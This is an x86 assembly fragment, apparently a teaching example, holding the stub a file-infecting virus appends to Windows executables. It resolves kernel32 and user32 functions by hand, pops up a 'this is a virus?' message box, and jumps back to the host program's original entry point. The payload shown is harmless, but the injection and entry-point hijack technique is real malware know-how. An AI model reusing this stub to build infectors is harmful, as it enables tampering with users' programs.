
_ProtoGetProcAddress	typedef	proto	:dword,:dword
_ProtoLoadLibrary	typedef	proto	:dword
_ProtoMessageBox	typedef	proto	:dword,:dword,:dword,:dword
_ApiGetProcAddress	typedef	ptr	_ProtoGetProcAddress
_ApiLoadLibrary		typedef	ptr	_ProtoLoadLibrary
_ApiMessageBox		typedef	ptr	_ProtoMessageBox

APPEND_CODE	equ	this byte

include		exception.asm
include		getkernel.asm
include 	getapi.asm

hDllKernel32	dd	?
hDllUser32		dd	?
_GetProcAddress	_ApiGetProcAddress	?
_LoadLibrary	_ApiLoadLibrary		?
_MessageBox		_ApiMessageBox		?
szLoadLibrary	db	'LoadLibraryA',0
szGetProcAddress db	'GetProcAddress',0
szUser32		db	'user32',0
szMessageBox	db	'MessageBoxA',0
szCaption		db	'Error:',0
szText			db	'this is a virus?',0

_NewEntry:

; relocate the address

		call	@F
		@@:
		pop	ebx
		sub	ebx,offset @B

		invoke	_GetKernelBase,[esp]	;get the base address of Kernelbase
		.if	! eax
			jmp	_ToOldEntry
		.endif
		mov	[ebx+hDllKernel32],eax
		lea	eax,[ebx+szGetProcAddress]
		invoke	_GetApi,[ebx+hDllKernel32],eax ; get the entry address of GetProcAddress
		.if	! eax
			jmp	_ToOldEntry
		.endif
		mov	[ebx+_GetProcAddress],eax

		lea	eax,[ebx+szLoadLibrary]	    ;get the entry address of LoadLibrary
		invoke	[ebx+_GetProcAddress],[ebx+hDllKernel32],eax
		mov	[ebx+_LoadLibrary],eax
		lea	eax,[ebx+szUser32]	;get the base address of User32
		invoke	[ebx+_LoadLibrary],eax
		mov	[ebx+hDllUser32],eax
		lea	eax,[ebx+szMessageBox]	;get the entry address of MessageBox
		invoke	[ebx+_GetProcAddress],[ebx+hDllUser32],eax
		mov	[ebx+_MessageBox],eax

		;pop out my meesagebox
		lea	ecx,[ebx+szText]
		lea	eax,[ebx+szCaption]
		invoke	[ebx+_MessageBox],NULL,ecx,eax,MB_YESNO or MB_ICONQUESTION
		.if	eax !=	IDYES
			ret
		.endif
		
; go to the old entry point and come back to execute the orignal file

_ToOldEntry:
		db	0e9h	
_dwOldEntry:
		dd	?	

APPEND_CODE_END	equ	this byte


